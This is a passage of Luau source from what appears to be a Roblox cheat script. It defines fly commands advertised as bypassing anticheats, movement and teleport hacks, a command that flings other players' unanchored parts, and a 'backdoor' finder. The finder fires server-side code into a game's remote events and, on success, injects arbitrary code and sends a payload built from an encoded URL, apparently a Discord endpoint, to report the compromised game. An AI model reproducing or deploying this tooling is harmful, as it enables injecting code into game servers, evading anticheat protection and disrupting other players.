		client.Character.HumanoidRootPart.CFrame = (target.Character:WaitForChild("HumanoidRootPart").CFrame*CFrame.new(0, -.1, -1))*CFrame.Angles(math.pi, 0, 0)
		for _, limb in client.Character:GetDescendants() do
			if limb:IsA("BasePart") then
				limb.Velocity = Vector3.zero
				limb.Massless = true
			end
		end
	end)
end)

add_command("un69", "stop 69ing", {}, {}, function(args)
	IS69 = false
	client.Character.Humanoid.Sit = false
	for _, limb in client.Character:GetDescendants() do
		if limb:IsA("BasePart") then
			limb.Massless = false
		end
	end
end)

local FLY = false
local FLY_SPEED = .1
local FLY_CTRL = {F=0, B=0, L=0, R=0, Q=0, E=0}
local FLY_LAST_CTRL = {F=0, B=0, L=0, R=0, Q=0, E=0}
local FLY_GYRO = true
local FLYDIE = false
local VFLY = false
add_command("fly", "fly", {"speed?"}, {}, function(args)
	exec_cmd("unfly")
	if FLY or not client.Character then
		return
	end

	if args[1] and tonumber(args[1]) then
		FLY_SPEED = tonumber(args[1])
	end

	FLY = true

	local torso = (client.Character:FindFirstChild("Torso") or client.Character:FindFirstChild("UpperTorso")) or client.Character.HumanoidRootPart
	local bg: BodyGyro = instance_new("BodyGyro", {
		P = 9e4,
		MaxTorque = Vector3.new(9e9, 9e9, 9e9),
		CFrame = torso.CFrame,
	}, torso)
	local bv: BodyVelocity = instance_new("BodyVelocity", {
		Velocity = Vector3.new(0, .1, 0),
		MaxForce = Vector3.new(9e9, 9e9, 9e9),
	}, torso)
	local speed = 0

	local c1 = conn(client.Character.Humanoid.Died, function(c)
		FLYDIE = true
		exec_cmd("unfly")
		c:Disconnect()
	end)

	local c2 = conn(client.CharacterAdded, function(c)
		FLYDIE = false
		task.wait(1)
		exec_cmd(`fly {FLY_SPEED}`)
		c:Disconnect()
	end)

	conn(rs.RenderStepped, function(c)
		if not FLY then
			c:Disconnect()
			return
		end

		if not VFLY then
			client.Character.Humanoid.PlatformStand = true
		end

		if FLY_CTRL.L + FLY_CTRL.R ~= 0 or FLY_CTRL.F + FLY_CTRL.B ~= 0 or FLY_CTRL.Q + FLY_CTRL.E ~= 0 then
			speed = 50
		elseif not (FLY_CTRL.L + FLY_CTRL.R ~= 0 or FLY_CTRL.F + FLY_CTRL.B ~= 0 or FLY_CTRL.Q + FLY_CTRL.E ~= 0) and speed ~= 0 then
			speed = 0
		end
		if (FLY_CTRL.L + FLY_CTRL.R) ~= 0 or (FLY_CTRL.F + FLY_CTRL.B) ~= 0 or (FLY_CTRL.Q + FLY_CTRL.E) ~= 0 then
			bv.Velocity = ((camera.CoordinateFrame.lookVector*(FLY_CTRL.F + FLY_CTRL.B))+((camera.CoordinateFrame * CFrame.new(FLY_CTRL.L+FLY_CTRL.R, (FLY_CTRL.F+FLY_CTRL.B+FLY_CTRL.Q+FLY_CTRL.E) * 0.2, 0).Position)-camera.CoordinateFrame.p))*speed
			FLY_LAST_CTRL = {F = FLY_CTRL.F, B = FLY_CTRL.B, L = FLY_CTRL.L, R = FLY_CTRL.R}
		elseif (FLY_CTRL.L + FLY_CTRL.R) == 0 and (FLY_CTRL.F + FLY_CTRL.B) == 0 and (FLY_CTRL.Q + FLY_CTRL.E) == 0 and speed ~= 0 then
			bv.Velocity = ((camera.CoordinateFrame.lookVector * (FLY_LAST_CTRL.F + FLY_LAST_CTRL.B)) + ((camera.CoordinateFrame * CFrame.new(FLY_LAST_CTRL.L + FLY_LAST_CTRL.R, (FLY_LAST_CTRL.F + FLY_LAST_CTRL.B + FLY_CTRL.Q + FLY_CTRL.E) * 0.2, 0).Position) - camera.CoordinateFrame.Position)) * speed
		else
			bv.Velocity = Vector3.new(0, 0, 0)
		end
		if FLY_GYRO then
			bg.CFrame = camera.CoordinateFrame
		end
	end, function()
		bg:Destroy()
		bv:Destroy()
		c1:Disconnect()
		if not FLYDIE then
			c2:Disconnect()
		end
	end)
end)

add_command("flygyro", "toggle whether or not to rotate your character to your camera (turn this off+floatplatform = anti fall dmg fly)", {}, {}, function(args)
	FLY_GYRO = not FLY_GYRO
end)

add_command("flyspeed", "set fly speed", {"speed"}, {"flys"}, function(args)
	if #args < 1 or not tonumber(args[1]) then
		return
	end

	FLY_SPEED = tonumber(args[1])
end)

add_command("vehiclefly", "allows you to fly in a vehicle", {"speed?"}, {"vhfly"}, function(args)
	VFLY = true
	exec_cmd(`fly{(args[1] and tonumber(args[1])) and ` {args[1]}` or ''}`)
end)

add_command("unvehiclefly", "stop vehicleflying", {}, {"unvhfly"}, function(args)
	VFLY = false
	exec_cmd("unfly")
end)

add_command("unfly", "turns off fly", {}, {}, function(args)
	if not FLY or not client.Character then
		return
	end

	FLY = false
	client.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
	pcall(function() camera.CameraType = Enum.CameraType.Custom end)
end)

local CFLYSPEED = 50
local CFLYCONN = nil
local CFLYPART = nil
local CFLY1 = nil
local CFLY2 = nil
local CFLYDIE = false
add_command("cframefly", "bypasses most fly anticheats by using cframe instead of position <font size=\"15\">other people can see this version of it</font>", {"speed?"}, {"cfly"}, function(args)
	if not client.Character then
		return
	end

	exec_cmd("uncfly")

	CFLYSPEED = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 50

	local part = instance_new("Part", {
		Name = "cfly_part",
		Size = Vector3.new(1, 1, 1),
		Transparency = .8,
		Color = Color3.fromRGB(255, 0, 0),
		Position = client.Character.HumanoidRootPart.Position,
		Anchored = true,
		CanCollide = false,
	}, workspace)
	CFLYPART = part

	CFLY2 = conn(client.Character.Humanoid.Died, function(c)
		CFLYDIE = true
		exec_cmd("uncfly")
		c:Disconnect()
	end)

	CFLY1 = conn(client.CharacterAdded, function(c)
		CFLYDIE = false
		task.wait(1)
		exec_cmd(`cfly {CFLYSPEED}`)
		c:Disconnect()
	end)

	CFLYCONN = rs.Heartbeat:Connect(function(delta)
		if not client.Character or not client.Character:FindFirstChild("Humanoid") or not client.Character:FindFirstChild("HumanoidRootPart") then
			return
		end

		local hum = client.Character.Humanoid
		local hrp = client.Character.HumanoidRootPart

		local md = hum.MoveDirection*(CFLYSPEED*delta)
		local cf = part.CFrame
		local cam_cf = camera.CFrame
		local cam_offs = cf:ToObjectSpace(cam_cf).Position
		cam_cf = cam_cf*CFrame.new(-cam_offs.X, -cam_offs.Y, -cam_offs.Z + 1)
		local cam_pos = cam_cf.Position
		local pos = part.Position
		local vel = CFrame.new(cam_pos, Vector3.new(pos.X, cam_pos.Y, pos.Z)):VectorToObjectSpace(md)
		local goal = CFrame.new(pos)*(cam_cf-cam_pos)*CFrame.new(vel)
		part.CFrame = goal
		hrp.CFrame = part.CFrame
	end)
end)

add_command("cframeflyspeed", "change cframe fly speed", {"speed?"}, {"cflys"}, function(args)
	CFLYSPEED = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 50
end)

add_command("uncframefly", "stop cframe flying", {}, {"uncfly"}, function(args)
	if CFLY1 then
		CFLY1:Disconnect()
	end
	if CFLY2 and not CFLYDIE then
		CFLY2:Disconnect()
	end
	if CFLYCONN then
		CFLYCONN:Disconnect()
	end
	if CFLYPART then
		CFLYPART:Destroy()
	end
end)

local VFLYSPEED = 50
local VFLYCONN = nil
local VFLYPART = nil
local VFLY1 = nil
local VFLY2 = nil
local VFLYDIE = false
add_command("velocityfly", "bypasses most fly anticheats by using velocity instead of position", {"speed?"}, {"vfly"}, function(args)
	if not client.Character then
		return
	end

	exec_cmd("unvfly")

	VFLYSPEED = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 50

	local part = instance_new("Part", {
		Name = "vfly_part",
		Size = Vector3.new(1, 1, 1),
		Transparency = .8,
		Color = Color3.fromRGB(255, 0, 0),
		Position = client.Character.HumanoidRootPart.Position,
		Anchored = true,
		CanCollide = false,
	}, workspace)
	VFLYPART = part

	VFLY1 = conn(client.Character.Humanoid.Died, function(c)
		VFLYDIE = true
		exec_cmd("unvfly")
		c:Disconnect()
	end)

	VFLY2 = conn(client.CharacterAdded, function(c)
		VFLYDIE = false
		task.wait(1)
		exec_cmd(`vfly {VFLYSPEED}`)
		c:Disconnect()
	end)

	VFLYCONN = rs.Heartbeat:Connect(function(delta)
		if not client.Character or not client.Character:FindFirstChild("Humanoid") or not client.Character:FindFirstChild("HumanoidRootPart") then
			return
		end

		local hum = client.Character.Humanoid
		local hrp = client.Character.HumanoidRootPart

		local md = hum.MoveDirection*(VFLYSPEED*delta)
		local cf = part.CFrame
		local cam_cf = camera.CFrame
		local cam_offs = cf:ToObjectSpace(cam_cf).Position
		cam_cf = cam_cf*CFrame.new(-cam_offs.X, -cam_offs.Y, -cam_offs.Z + 1)
		local cam_pos = cam_cf.Position
		local pos = part.Position
		local vel = CFrame.new(cam_pos, Vector3.new(pos.X, cam_pos.Y, pos.Z)):VectorToObjectSpace(md)
		local goal = CFrame.new(pos)*(cam_cf-cam_pos)*CFrame.new(vel)
		part.CFrame = goal
		hrp.Velocity = (part.CFrame-hrp.Position).Position*VFLYSPEED
	end)
end)

add_command("velocityflyspeed", "change velocity fly speed", {"speed?"}, {"vflys"}, function(args)
	VFLYSPEED = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 50
end)

add_command("unvelocityfly", "stop velocity flying", {}, {"unvfly"}, function(args)
	if VFLY1 then
		VFLY1:Disconnect()
	end
	if VFLY2 and not VFLYDIE then
		VFLY2:Disconnect()
	end
	if VFLYCONN then
		VFLYCONN:Disconnect()
	end
	if VFLYPART then
		VFLYPART:Destroy()
	end
end)

local SPIN: BodyAngularVelocity? = nil
add_command("spin", "go in circles", {"speed?"}, {}, function(args)
	exec_cmd("unspin")

	if not client.Character then
		return
	end

	local speed = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 20
	SPIN = instance_new("BodyAngularVelocity", {
		Name = "EXPLOIT_SPIN",
		MaxTorque = Vector3.new(0, math.huge, 0),
		AngularVelocity = Vector3.new(0, speed, 0),
	}, client.Character:WaitForChild("HumanoidRootPart"))
end)

add_command("unspin", "stop spinning", {}, {}, function(args)
	if SPIN then
		SPIN:Destroy()
	end
end)

local WS_EN = false
add_command("walkspeed", "sets walkspeed", {"speed"}, {"ws"}, function(args)
	if not args[1] or not tonumber(args[1]) then
		return
	end

	if WS_EN == true then
		WS_EN = false
		task.wait(0.5)
	end

	WS_EN = true

	conn(rs.Heartbeat, function(c)
		if not WS_EN then
			c:Disconnect()
			return
		end

		if not client.Character then
			return
		end

		client.Character.Humanoid.WalkSpeed = tonumber(args[1])
	end)
end)

local JP_EN = false
add_command("jumppower", "sets jump power", {"power"}, {"jp"}, function(args)
	if not args[1] or not tonumber(args[1]) then
		return
	end

	if JP_EN then
		JP_EN = false
		task.wait(0.5)
	end

	JP_EN = true

	conn(rs.Heartbeat, function(c)
		if not JP_EN then
			c:Disconnect()
			return
		end

		client.Character.Humanoid.UseJumpPower = true
		client.Character.Humanoid.JumpPower = tonumber(args[1])
	end)
end)

local SEAT_TREE: {[Seat]: {dis: boolean, coll: boolean, touch: boolean}} = {}
local ANTISEAT = false
add_command("antiseat", "disables all seats, which sometimes can screw up things like lerpgoto", {}, {"anseat"}, function(args)
	if ANTISEAT then
		return
	end

	for _, seat: Seat in workspace:GetDescendants() do
		if not SEAT_TREE[seat] and seat:IsA("Seat") then
			SEAT_TREE[seat] = {}
			SEAT_TREE[seat].dis = seat.Disabled
			SEAT_TREE[seat].coll = seat.CanCollide
			SEAT_TREE[seat].touch = seat.CanTouch
		end
	end

	for seat, _ in SEAT_TREE do
		seat.Disabled = true
		seat.CanCollide = false
		seat.CanTouch = false
	end

	client.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, false)
end)

add_command("unantiseat", "reenables all previously disabled seats", {}, {"unanseat"}, function(args)
	client.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)

	for seat, v in SEAT_TREE do
		seat.Disabled = v.dis
		seat.CanCollide = v.coll
		seat.CanTouch = v.touch
	end
end)

local TERR_SWIM = false
add_command("terrainswim", "uses water terrain to let you swim in the air", {}, {"terrswim", "tswim"}, function(args)
	if TERR_SWIM then
		return
	end
	TERR_SWIM = true

	local regions: {Region3} = {}
	local step: number = 0
	local prev = {workspace.Terrain.WaterTransparency, workspace.Terrain.WaterReflectance}

	conn(rs.RenderStepped, function(c)
		if not TERR_SWIM then
			c:Disconnect()
			return
		end

		if not client.Character then
			return
		end

		if #regions > 10 then
			workspace.Terrain:FillRegion(regions[1], 4, Enum.Material.Air)
			table.remove(regions, 1)
		end

		local pos = client.Character.HumanoidRootPart.Position
		local size = Vector3.new(20, 20, 20)
		local reg = Region3.new(pos-size/2, pos+size/2)
		table.insert(regions, reg)
		workspace.Terrain.WaterReflectance = 0
		workspace.Terrain.WaterTransparency = 1
		workspace.Terrain:FillRegion(reg, 4, Enum.Material.Water)
	end, function()
		for _, reg in regions do
			workspace.Terrain:FillRegion(reg, 4, Enum.Material.Air)
		end

		workspace.Terrain.WaterTransparency = prev[1]
		workspace.Terrain.WaterReflectance = prev[2]
	end)
end)

add_command("unterrainswim", "stops terrain swimming", {}, {"unterrswim", "untswim"}, function(args)
	TERR_SWIM = false
end)

local SWIM = false
add_command("swim", "swim in the air", {}, {}, function(args)
	if SWIM or not client.Character then
		return
	end

	SWIM = true

	local char = client.Character
	local hum = char.Humanoid

	local prev_grav = workspace.Gravity
	workspace.Gravity = 0

	local states = Enum.HumanoidStateType:GetEnumItems()
	table.remove(states, table.find(states, Enum.HumanoidStateType.None))
	for _, s in states do
		hum:SetStateEnabled(s, false)
	end
	hum:ChangeState(Enum.HumanoidStateType.Swimming)

	conn(rs.RenderStepped, function(c)
		if not SWIM then
			c:Disconnect()
			return
		end

		if not char then
			return
		end

		char.HumanoidRootPart.Velocity = ((hum.MoveDirection ~= Vector3.new() or uis:IsKeyDown(Enum.KeyCode.Space)) and char.HumanoidRootPart.Velocity or Vector3.new())
	end, function()
		workspace.Gravity = prev_grav
		for _, s in states do
			hum:SetStateEnabled(s, true)
		end
	end)
end)

add_command("unswim", "stop swimming in the air", {}, {}, function(args)
	SWIM = false
end)

add_command("tpcoor", "teleport to coordinates", {"coors"}, {}, function(args)
	if #args < 3 or not (tonumber(args[1]) and tonumber(args[2]) and tonumber(args[3])) then
		return
	end

	client.Character:SetPrimaryPartCFrame(CFrame.new(Vector3.new(tonumber(args[1]), tonumber(args[2]), tonumber(args[3]))))
end)

add_command("coors", "print your coordinates and tries to copy them", {}, {}, function(args)
	if not client.Character then
		return
	end

	local coor: Vector3 = client.Character.HumanoidRootPart.Position

	if setclipboard then
		setclipboard(`{coor.X} {coor.Y} {coor.Z}`)
		notify("Coordinates", "Coordinates copied to clipboard!", 2)
	else
		local x, y, z  = math.floor(coor.X*100)/100, math.floor(coor.Y*100)/100, math.floor(coor.Z*100)/100
		notify("Coordinates", `<b><font color="rgb(255, 235, 20)">Your exploit isn't supported to copy the coordinates.</font></b>\nHowever, your coordinates are {x}, {y}, {z}`, 10)
	end	
end)

local ESP_PLR: Player? = nil
local SPEC_PLR: Player? = nil
local ESP_MENU_EN = false

local SPEC = false
local SPEC_CYCLE: {Player} = {}
local SPEC_I: number = 1

spectate.prev.Activated:Connect(function()
	if SPEC_I <= 1 then
		SPEC_I = 1
	else
		SPEC_I -= 1
	end

	SPEC_PLR = SPEC_CYCLE[SPEC_I]
end)

spectate.next.Activated:Connect(function()
	if SPEC_I >= #SPEC_CYCLE then
		SPEC_I = #SPEC_CYCLE
	else
		SPEC_I += 1
	end

	SPEC_PLR = SPEC_CYCLE[SPEC_I]
end)

function spec_menu_toggle(value: boolean)
	local TI = TweenInfo.new(.3, Enum.EasingStyle.Sine)

	if value then
		spectate.Visible = true
		tween(spectate, TI, { BackgroundTransparency = .3 })
		tween({spectate.prev, spectate.next}, TI, { BackgroundTransparency = 0 })
		tween({spectate.prev.icon, spectate.next.icon}, TI, { ImageTransparency = .3 })
		tween(spectate.user, TI, { BackgroundTransparency = .8, TextTransparency = 0 })
	else
		tween(spectate, TI, { BackgroundTransparency = 1 })
		tween({spectate.prev, spectate.next}, TI, { BackgroundTransparency = 1 })
		tween({spectate.prev.icon, spectate.next.icon}, TI, { ImageTransparency = 1 })
		tween(spectate.user, TI, { BackgroundTransparency = 1, TextTransparency = 1 })
		delay(.3, function()
			spectate.Visible = false
		end)
	end
end

add_command("spectate", "toggles the spectate menu (press F4 while spectating to open viewer menu)", {"user?"}, {"spec"}, function(args)
	if SPEC then
		return
	end

	SPEC = true
	spec_menu_toggle(true)

	local target_sub: Instance? = nil
	local subjectConn = conn(camera:GetPropertyChangedSignal("CameraSubject"), function()
		if target_sub and camera.CameraSubject ~= target_sub then
			camera.CameraSubject = target_sub
		end
	end)

	for _, p in plrs:GetPlayers() do
		if p.UserId ~= client.UserId then
			table.insert(SPEC_CYCLE, p)
		end
	end

	if args[1] then
		local p = arg_plr(args[1])
		if p ~= nil then
			SPEC_PLR = p
			SPEC_I = table.find(SPEC_CYCLE, p) or 1
		end
	end

	conn(rs.Heartbeat, function(c)
		if not SPEC then
			c:Disconnect()
			return
		end

		for _, p in plrs:GetPlayers() do
			if (not table.find(SPEC_CYCLE, p)) and p.UserId ~= client.UserId  then
				table.insert(SPEC_CYCLE, p)
			end
		end

		for i, p in SPEC_CYCLE do
			if (not p) or (not p.UserId) or (not plrs:GetPlayerByUserId(p.UserId)) then
				table.remove(SPEC_CYCLE, i)
			end
		end

		if SPEC_I >= #SPEC_CYCLE then
			SPEC_I = #SPEC_CYCLE
			SPEC_PLR = SPEC_CYCLE[SPEC_I]
		elseif SPEC_I <= 1 then
			SPEC_I = 1
			SPEC_PLR = SPEC_CYCLE[1]
		end

		if client.Character then
			local prev = target_sub
			target_sub = (SPEC_PLR and SPEC_PLR.Character) and SPEC_PLR.Character or client.Character
			if target_sub ~= prev then
				camera.CameraSubject = target_sub
			end
		else
			target_sub = nil
		end

		spectate.user.Text = SPEC_PLR and `<b>{SPEC_PLR.Name}</b> <font size="16">(@{SPEC_PLR.DisplayName})</font>` or "<b>None</b>"
	end, function()
		target_sub = client.Character
		camera.CameraSubject = client.Character
		subjectConn:Disconnect()
	end)
end)

add_command("unspectate", "stop spectating", {}, {"unspec"}, function(args)
	SPEC = false
	SPEC_PLR = nil
	spec_menu_toggle(false)
end)

local LIGHT: PointLight? = nil
add_command("light", "add a client-sided light around you to see better", {"brightness?"}, {}, function(args)
	if LIGHT then
		LIGHT:Destroy()
	end

	if not client.Character then
		return
	end

	LIGHT = instance_new("PointLight", {
		Brightness = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 3,
		Range = 60,
	}, client.Character.PrimaryPart)
end)

add_command("unlight", "remove the light", {}, {}, function(args)
	LIGHT:Destroy()
end)

local BACKDOOR_EN = false
local BACKDOOR_EDITOR = false
local BACKDOOR_SEL: {string} = {}
local BACKDOOR_REF: {[string]: {r: RemoteEvent|RemoteFunction, t: TextButton}} = {}
local BACKDOORED = false

function backdoor_find(hash: string): {r: RemoteEvent|RemoteFunction, t: TextButton}?
	for h, a in BACKDOOR_REF do
		if h == hash then
			return a
		end
	end

	return nil
end

function backdoor_attempt(arr: {string}): boolean
	for _, hash in arr do
		local e = backdoor_find(hash)
		if not e then continue end
		e = e.r

		if e:IsA("RemoteEvent") then
			e:FireServer(string.format(BACKDOOR_TEST_SS_CODE, string.char(table.unpack(DISC_URL))))
		else
			pcall(e.InvokeServer, e, BACKDOOR_TEST_SS_CODE)
		end

		task.wait(client:GetNetworkPing()*4)
	end

	task.wait(1)

	return reps:FindFirstChild("FINITE_RESISTANCE_BACKDOOR_SEND")
end

function backdoor_menu_toggle(v: boolean)
	BACKDOOR_EN = v

	local TI = TweenInfo.new(.3, Enum.EasingStyle.Sine)

	if v then
		backdoor.Visible = true
		backdoor.remotes.Visible = true
		backdoor.code.Visible = false
		BACKDOOR_EDITOR = false
		backdoor.title.btns.editor.Text = "Editor"
		backdoor.code.BackgroundTransparency = .5
		backdoor.code.TextTransparency = 0
		tween(backdoor, TI, { BackgroundTransparency = .3 })
		tween(backdoor.title.title, TI, { TextTransparency = 0 })
		tween(filter(backdoor.title.btns:GetChildren(), function(x) return x:IsA("TextButton") end), TI, { BackgroundTransparency = 0, TextTransparency = 0 })
		for _, b in backdoor.remotes:GetChildren() do
			if b:IsA("TextButton") then
				tween(b, TI, { BackgroundTransparency = 0 })
				tween(b.icon, TI, { ImageTransparency = 0 })
				tween(b.txt, TI, { TextTransparency  = 0 })
			end
		end
	else
		tween(backdoor, TI, { BackgroundTransparency = 1 })
		tween(backdoor.title.title, TI, { TextTransparency = 1 })
		tween(backdoor.code, TI, { BackgroundTransparency = 1, TextTransparency = 1 })
		tween(filter(backdoor.title.btns:GetChildren(), function(x) return x:IsA("TextButton") end), TI, { BackgroundTransparency = 1, TextTransparency = 1 })
		for _, b in backdoor.remotes:GetChildren() do
			if b:IsA("TextButton") then
				tween(b, TI, { BackgroundTransparency = 1 })
				tween(b.icon, TI, { ImageTransparency = 1 })
				tween(b.txt, TI, { TextTransparency  = 1 })
			end
		end
		task.delay(.3, function()
			backdoor.Visible = false
		end)
	end
end

backdoor.title.btns.editor.Activated:Connect(function()
	if not BACKDOOR_EN then
		return
	end

	BACKDOOR_EDITOR = not BACKDOOR_EDITOR

	if BACKDOOR_EDITOR then
		backdoor.title.btns.editor.Text = "Back"
		backdoor.remotes.Visible = false
		backdoor.code.Visible = true
	else
		backdoor.title.btns.editor.Text = "Editor"
		backdoor.remotes.Visible = true
		backdoor.code.Visible = false
	end
end)

backdoor.title.btns.exclude.Activated:Connect(function()
	for _, tag in BACKDOOR_SEL do
		local e = backdoor_find(tag)
		if not e then continue end

		if not e.r:HasTag("BackdoorExcluded") then
			e.r:AddTag("BackdoorExcluded")
		end

		e.t.BackgroundColor3 = Color3.fromRGB(102, 0, 0)
	end
end)

backdoor.title.btns.include.Activated:Connect(function()
	for _, tag in BACKDOOR_SEL do
		local e = backdoor_find(tag)
		if not e then continue end

		if e.r:HasTag("BackdoorExcluded") then
			e.r:RemoveTag("BackdoorExcluded")
		end

		e.t.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	end
end)

backdoor.title.btns.attempt.Activated:Connect(function()
	if BACKDOORED then 
		reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
		return
	end

	local succ = backdoor_attempt(BACKDOOR_SEL)
	BACKDOORED = succ

	if succ then
		notify("Backdoor", `<b><font color="rgb(66, 255, 37)"><font size="19">Backdoor found!</font></font></b>\nInjected provided SS code, if any. All new backdoor attempts will execute SS code.`, 5)
		if not rs:IsStudio() then
			reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(string.format(BACKDOOR_SEND_SS_CODE, string.char(table.unpack(DISC_URL))))
		end
		if backdoor.code.Text:len() > 0 then
			reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
		end
	else
		notify("Backdoor", `<b><font color="rgb(255, 0, 0)"><font size="19">No found backdoors.</font></font></b>`, 3)
	end
end)

backdoor.title.btns.attempt_all.Activated:Connect(function()
	if BACKDOORED then
		reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
		return
	end

	local arr: {string} = {}

	for s, a in BACKDOOR_REF do
		if not a.r:HasTag("BackdoorExcluded") then
			table.insert(arr, s)
		end
	end

	local succ = backdoor_attempt(arr)
	BACKDOORED = succ

	if succ then
		notify("Backdoor", `<b><font color="rgb(66, 255, 37)"><font size="19">Backdoor found!</font></font></b>\nInjected provided SS code, if any. All new backdoor attempts will execute SS code.`, 5)
		
		if backdoor.code.Text:len() > 0 then
			reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
		end
	else
		notify("Backdoor", `<b><font color="rgb(255, 0, 0)"><font size="19">No found backdoors.</font></font></b>`, 3)
	end
end)

add_command("backdoor", "open the backdoor finder (games rarely have backdoors, most of the time doesnt work with REs/RFs)", {}, {"bd"}, function(args)
	if BACKDOOR_EN then
		return
	end
	backdoor_menu_toggle(true)

	conn(rs.Heartbeat, function(c)
		if not BACKDOOR_EN then
			c:Disconnect()
			return
		end

		for _, r in game:GetDescendants() do
			if (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) and (not r:HasTag("BackdoorHashed")) and backdoor_filter(r) then
				local hash = rand_str()
				r:AddTag(hash)
				r:AddTag("BackdoorHashed")

				local btn = backdoor_temp:Clone()
				btn.txt.Text = r:GetFullName()
				btn.icon.Image = r:IsA("RemoteEvent") and "http://www.roblox.com/asset/?id=13936075598" or "rbxassetid://13936070051"
				btn.Parent = backdoor.remotes

				local s = false

				btn.Activated:Connect(function()
					s = not s
					if not s then
						table.remove(BACKDOOR_SEL, table.find(BACKDOOR_SEL, hash))
						btn.BackgroundColor3 = r:HasTag("BackdoorExcluded") and Color3.fromRGB(159, 0, 0) or Color3.fromRGB(30, 30, 30)
						btn.BackgroundTransparency = .7
					else
						table.insert(BACKDOOR_SEL, hash)
						btn.BackgroundColor3 = r:HasTag("BackdoorExcluded") and Color3.fromRGB(102, 0, 0) or Color3.fromRGB(20, 20, 20)
						btn.BackgroundTransparency = .05
					end
				end)

				BACKDOOR_REF[hash] = {r=r, t=btn}
			end
		end

		for hash, a in BACKDOOR_REF do
			if not a.r then
				a.f:Destroy()
				if table.find(BACKDOOR_SEL, hash) then
					table.remove(BACKDOOR_SEL, hash)
				end
				BACKDOOR_REF[hash] = nil
			end
		end
	end)
end)

add_command("unbackdoor", "close the backdoor finder", {}, {"unbd"}, function(args)
	if not BACKDOOR_EN then
		return
	end
	backdoor_menu_toggle(false)
end)

local PSPIN = false
add_command("partspin", "makes all the parts go in a funny circle around you", {"speed?", "radius?"}, {"pspin"}, function(args)
	exec_cmd("unpartspin")
	PSPIN = true

	local speed = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 1
	local radius = (args[2] and tonumber(args[2])) and (tonumber(args[2]))*10 or 100

	local PARTS: {BasePart} = {}

	local function is_ok(p: BasePart): boolean
		if p:IsA("BasePart") and not p.Anchored and p:IsDescendantOf(workspace) then
			if p.Parent == client.Character or p:IsDescendantOf(client.Character) then
				return false
			end

			p.CustomPhysicalProperties = PhysicalProperties.new(0.001, 0, 0, 0, 0)
			p.CanCollide = false
			return true
		end

		return false
	end

	for _, p in workspace:GetDescendants() do
		if is_ok(p) then
			table.insert(PARTS, p)
		end
	end

	local conn1 = conn(workspace.DescendantAdded, function(p)
		if is_ok(p) then
			table.insert(PARTS, p)
		end
	end)

	local conn2 = conn(workspace.DescendantRemoving, function(p)
		if table.find(PARTS, p) then
			table.remove(PARTS, table.find(PARTS, p))
		end
	end)

	client.ReplicationFocus = workspace

	for _, p in workspace:GetDescendants() do
		if p:IsAncestorOf(workspace) and p:IsA("BasePart") then
			p.Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
		end
	end

	conn(rs.Heartbeat, function(c)
		if not PSPIN then
			c:Disconnect()
			return
		end

		local center = client.Character.HumanoidRootPart.Position

		for _, p in PARTS do
			local pos = p.Position
			local d = (Vector3.new(pos.X, center.Y, pos.Z) - center).Magnitude
			local a = math.atan2(pos.Z - center.Z, pos.X - center.X)
			local new_a = a + math.rad(speed)
			local t_pos = Vector3.new(
				center.X + math.cos(new_a) * math.min(radius, d),
				center.Y + (100*(math.abs(math.sin((pos.Y-center.Y)/100)))),
				center.Z + math.sin(new_a) * math.min(radius, d)
			)
			local directionToTarget = (t_pos - p.Position).unit
			p.Velocity = directionToTarget*1e3
		end
	end, function()
		conn1:Disconnect()
		conn2:Disconnect()

		for _, p in workspace:GetDescendants() do
			if (p:IsA("BasePart") and not p.Anchored) and not (p:IsDescendantOf(client.Character) or p.Parent == client.Character) then
				p.CanCollide = true
				p.CustomPhysicalProperties = PhysicalProperties.new(.7, .5, 1, .3, 1)
			end
		end
	end)
end)

add_command("unpartspin", "stop making the parts go around", {}, {"unpspin"}, function(args)
	PSPIN = false
end)

function esp_menu_toggle(v: boolean)
	ESP_MENU_EN = v
	local TI = TweenInfo.new(.3, Enum.EasingStyle.Sine)

	if v then
		esp_viewer.Visible = true
		tween(esp_viewer, TI, { BackgroundTransparency = .3 })
		tween({esp_viewer.actions, esp_viewer.stats, esp_viewer.inventory}, TI, { BackgroundTransparency = .5 })
		tween({esp_viewer.actions.title, esp_viewer.stats.title, esp_viewer.inventory.title, esp_viewer.title.displayname, esp_viewer.title.username}, TI, { TextTransparency = 0 })
		tween(esp_viewer.title.plricon, TI, { ImageTransparency = 0 })
		for _, btn in esp_viewer.actions:GetDescendants() do
			if btn:IsA("TextButton") then
				tween(btn, TI, { BackgroundTransparency = 0, TextTransparency = 0 })
			end
		end
		for _, i in esp_viewer.inventory.inv:GetChildren() do
			if i:IsA("Frame") then
				i:Destroy()
			end
		end
		for _, s in esp_viewer.stats:GetChildren() do
			if s:IsA("TextLabel") then
				tween(s, TI, { TextTransparency = 0 })
			end
		end
	else
		tween(esp_viewer, TI, { BackgroundTransparency = 1 })
		tween({esp_viewer.actions, esp_viewer.stats, esp_viewer.inventory}, TI, { BackgroundTransparency = 1 })
		tween({esp_viewer.actions.title, esp_viewer.stats.title, esp_viewer.inventory.title, esp_viewer.title.displayname, esp_viewer.title.username}, TI, { TextTransparency = 1 })
		tween(esp_viewer.title.plricon, TI, { ImageTransparency = 1 })
		for _, btn in esp_viewer.actions:GetDescendants() do
			if btn:IsA("TextButton") then
				tween(btn, TI, { BackgroundTransparency = 1, TextTransparency = 1 })
			end
		end
		for _, i in esp_viewer.inventory.inv:GetChildren() do
			if i:IsA("Frame") then
				tween(i, TI, { BackgroundTransparency = 1 })
				tween(i.label, TI, { TextTransparency = 1 })
			end
		end
